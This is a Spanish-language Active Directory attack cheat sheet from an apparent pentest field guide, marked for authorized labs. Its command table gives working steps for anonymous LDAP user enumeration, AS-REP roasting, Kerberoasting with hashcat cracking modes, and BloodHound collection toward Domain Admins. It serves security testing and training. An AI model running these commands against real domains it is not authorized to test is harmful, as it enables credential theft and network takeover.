---
titulo: "Active Directory"
categoria: Chuletas
dificultad: Operativa
prerrequisitos:
  - ../02_metodologia/construccion_y_adaptacion_de_payloads.md
fuentes_internas:
  - ../../tools/concepts.py
fuentes_externas: []
revision: 2026-07-14
estado: revisado
---

# Active Directory

Solo para laboratorios autorizados. Sustituye variables, confirma versión y guarda salida.

## Decisión rápida

1. Confirma alcance, identidad y conectividad.
2. Parte de una señal; no ejecutes toda la tabla.
3. Predice salida y prepara un control negativo.
4. Ejecuta la prueba menos intrusiva.
5. Registra evidencia y vuelve al módulo si falla.

## Señales

- Puertos 88, 389, 445, 636, 3268 abiertos en el mismo host.
- nmap/enum filtra un nombre de dominio (algo.local) y el hostname del DC.
- Puertos 389/636 abiertos junto a 88 (Kerberos) y 445 (SMB): confirma que es un DC.
- ldapsearch sin credenciales (bind anonimo) devuelve resultados en vez de error de autenticacion.
- GetNPUsers devuelve hashes $krb5asrep$ (hay usuarios sin preauth).
- GetUserSPNs lista cuentas de servicio con SPN y devuelve $krb5tgs$.
- Aristas 'GenericAll', 'WriteDACL', 'ForceChangePassword' hacia grupos privilegiados.
- Sesiones de un admin en una maquina donde tu tienes acceso.

## Comandos y pruebas

| Prueba | Objetivo/contexto | Evidencia esperada |
|---|---|---|
| `nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,636,3268,5985 $IP` | Escanea los puertos tipicos de un DC de una vez. La combinacion 88+389+445 confirma que estas ante un dominio y no una maquina suelta. | Puerto 88 abierto = DC. Los scripts LDAP/SMB filtran el nombre del dominio y del DC: anotalos para /etc/hosts antes de seguir. |
| `ldapsearch -x -H ldap://$IP -s base namingcontexts` | Bind anonimo (-x sin credenciales) pidiendo el naming context base. Es la prueba minima: si responde, el bind anonimo esta permitido. | Un defaultNamingContext tipo DC=corp,DC=local. Confirma el nombre del dominio y que puedes seguir consultando sin credenciales. |
| `ldapsearch -x -H ldap://$IP -D '' -w '' -b 'DC=corp,DC=local' '(objectClass=user)'` | Con el naming context ya conocido, pide todos los objetos de tipo usuario via bind anonimo. Es la enumeracion completa de usuarios sin credenciales. | Una lista de usuarios del dominio con sus atributos visibles. Extrae los nombres para spraying o Kerberoasting. |
| `impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP` | AS-REP roasting sin credenciales: pide tickets para usuarios con preauth desactivada. Solo necesitas la lista de usuarios y la IP del DC. | Hashes $krb5asrep$ para los usuarios vulnerables. Cada uno es crackeable offline (hashcat -m 18200). Sin salida = nadie tiene preauth desactivada. |
| `impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request` | Kerberoasting: con una credencial de dominio pides los tickets de las cuentas de servicio. Esas cuentas suelen tener passwords debiles y muchos permisos. | Hashes $krb5tgs$ junto al nombre del servicio. Prioriza los que parezcan admin; crackea con hashcat -m 13100. |
| `bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip` | Recolecta todo el grafo del dominio con una sola credencial, sin necesidad de pisar una maquina Windows. -c all junta toda la informacion; --zip lo deja listo para importar. | Un .zip para arrastrar a la GUI de BloodHound. Alli marca tu usuario como owned y lanza la consulta de rutas a Domain Admins. |

## Diagnóstico

| Síntoma | Comprobar |
|---|---|
| Sin respuesta | ruta, DNS, puerto, listener y firewall |
| Rechazo | sintaxis, credenciales, permisos y versión |
| Salida distinta | control negativo, caché y estado |
| Resultado parcial | identidad efectiva y precondiciones |

## Cierre

- Guardar comando adaptado y salida.
- Anotar qué confirma y qué no.
- No persistir secretos en notas compartidas.
- Restaurar cambios del laboratorio.

Fuente operativa: [conceptos de Fieldbook](../../tools/concepts.py). Método: [construcción de payloads](../02_metodologia/construccion_y_adaptacion_de_payloads.md).
